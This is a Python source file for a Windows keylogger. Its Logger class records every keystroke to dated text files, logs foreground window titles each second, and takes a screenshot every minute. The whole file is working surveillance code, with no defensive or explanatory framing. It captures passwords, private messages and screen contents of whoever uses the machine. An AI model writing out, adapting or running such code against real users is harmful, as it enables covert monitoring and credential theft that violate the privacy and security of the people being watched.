import sys
import time
from pynput.keyboard import Listener
import pyautogui
import datetime
import threading
import os
from win32gui import GetWindowText, GetForegroundWindow

lock = threading.Lock()


def get_dir_name():
    now = datetime.datetime.now()
    parent_dir = str(now.strftime('%d-%m-%Y'))
    log_dir = os.path.join(parent_dir, 'log')
    img_dir = os.path.join(parent_dir, 'img')
    return [log_dir, img_dir]


def get_img_path():
    now = datetime.datetime.now().strftime('%d-%m-%Y %H;%M.png')
    path = get_dir_name()[1]
    img_path = os.path.join(path, now)
    return img_path


def get_log_path():
    now = datetime.datetime.now().strftime('%d-%m-%Y')
    path = get_dir_name()[0]
    log_path = os.path.join(path, now)
    return log_path


def create_dir():
    now = datetime.datetime.now()
    parent_dir = str(now.strftime('%d-%m-%Y'))
    log_dir = os.path.join(parent_dir, 'log')
    img_dir = os.path.join(parent_dir, 'img')
    os.makedirs(log_dir, exist_ok=True)
    os.makedirs(img_dir, exist_ok=True)


def screenshot():
    img_path = get_img_path()
    if not os.path.isfile(img_path):
        curr_screen = pyautogui.screenshot()
        curr_screen.save(get_img_path())


def get_max_char():
    return 50


class Logger:
    def __init__(self):
        self.max_char = get_max_char()
        self.log_time = True
        self.running = False
        self.listener = Listener(on_press=self.on_press)
        self.count_down_thread = threading.Thread(target=self.count_down, args=(60,), daemon=True)
        self.switch = False

        create_dir()

    def count_down(self, sec):
        last_window = ""
        file_name = f'{get_log_path()} apps.txt'
        screenshot()
        sec = 60
        while self.switch:
            active_window = GetWindowText(GetForegroundWindow())
            now = datetime.datetime.now().strftime('\n[%H:%M] ')
            if active_window != last_window:
                last_window = active_window
                with open(file_name, 'a', encoding="utf-8") as file:
                    if active_window:
                        file.write(now)
                        file.write(active_window)
            sec -= 1
            time.sleep(1)
            if sec == 0:
                sec = 60
                screenshot()
                lock.acquire()
                self.log_time = True
                lock.release()
        return False

    def write_to_log(self, key):
        file_name = f'{get_log_path()} key.txt'
        with open(file_name, 'a') as file:
            if self.log_time:
                now = datetime.datetime.now().strftime('\n\n[%H:%M]\n')
                file.write(now)
                lock.acquire()
                self.max_char = get_max_char()
                self.log_time = False
                lock.release()
            key = str(key).replace("'", "")
            file.write(key)
            self.max_char -= 1
            if self.max_char == 0:
                self.max_char = get_max_char()
                file.write('\n')
            else:
                file.write(' ')

    def on_press(self, key):
        if not self.switch:
            return False
        self.write_to_log(key)
        try:
            print('alphanumeric key {0} pressed'.format(key.char))

        except AttributeError:
            print('special key {0} pressed'.format(key))

    def keylogger(self):
        if not self.running:
            self.running = True
            self.listener.start()

    def begin(self):
        self.switch = True
        self.count_down_thread.start()
        self.keylogger()

    def end(self):
        lock.acquire()
        self.switch = False
        lock.release()